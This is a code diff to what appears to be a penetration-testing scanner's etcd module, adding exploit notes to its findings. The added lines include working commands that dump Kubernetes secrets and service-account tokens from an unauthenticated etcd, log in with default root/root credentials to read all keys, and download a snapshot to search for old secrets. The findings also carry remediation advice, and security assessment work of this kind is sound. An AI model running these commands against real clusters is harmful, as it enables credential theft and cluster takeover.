@@ -247,9 +247,12 @@ def etcd_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
-            "tool": "etcdctl", "command": cmd, "remediation": rem, "cwes": cwes, "kind": kind}
+            "tool": "etcdctl", "command": cmd, "remediation": rem, "cwes": cwes,
+            "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -279,7 +282,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Enable client certificate authentication (--client-cert-auth). "
                     "Bind etcd to a private interface. Never expose 2379 to a "
                     "network shared with untrusted clients.",
-                    ["CWE-306", "CWE-284", "CWE-200"], kind="etcd_unauth_read"))
+                    ["CWE-306", "CWE-284", "CWE-200"], kind="etcd_unauth_read",
+                    exploit_note=(
+                        "ETCDCTL_API=3 etcdctl --endpoints http://<ip>:2379 get "
+                        "/registry/secrets/ --prefix -w json | jq -r "
+                        "'.kvs[]|.value|@base64d' > k8s_secrets.dump — decode SA "
+                        "tokens and TLS."),
+                    depth_tier="t1"))
             elif pr.get("default_cred_user"):
                 # Unauth reads failed but a seeded credential authenticated.
                 # This is critical: the token from /v3/auth/authenticate is
@@ -300,7 +309,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Rotate the etcd root password and every user password. Use "
                     "long random secrets, not deploy-template defaults. Prefer "
                     "--client-cert-auth over password auth for etcd.",
-                    ["CWE-798", "CWE-521"], kind="etcd_default_creds"))
+                    ["CWE-798", "CWE-521"], kind="etcd_default_creds",
+                    exploit_note=(
+                        "TOKEN=$(curl -sX POST http://<ip>:2379/v3/auth/authenticate "
+                        "-d '{\"name\":\"root\",\"password\":\"root\"}' | jq -r "
+                        ".token); curl -H \"authorization: $TOKEN\" -X POST "
+                        "http://<ip>:2379/v3/kv/range -d "
+                        "'{\"key\":\"AA==\",\"range_end\":\"AA==\"}'"),
+                    depth_tier="t3"))
             else:
                 # Reachable but no unauth read — still worth an info-level
                 # finding so the tester knows there's an etcd here to attack
@@ -338,7 +354,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "principals; enable --client-cert-auth. Note that snapshot "
                     "permission is gated separately from kv/range — auditing "
                     "kv/range alone is insufficient.",
-                    ["CWE-306", "CWE-200"], kind="etcd_snapshot_download"))
+                    ["CWE-306", "CWE-200"], kind="etcd_snapshot_download",
+                    exploit_note=(
+                        "curl -sk -X POST http://<ip>:2379/v3/maintenance/snapshot "
+                        "-o etcd-snap.db && etcdctl snapshot status etcd-snap.db && "
+                        "etcdctl snapshot restore etcd-snap.db --data-dir "
+                        "/tmp/etcd-restore — then grep bbolt for historic secrets."),
+                    depth_tier="t2"))
     return out
 
 
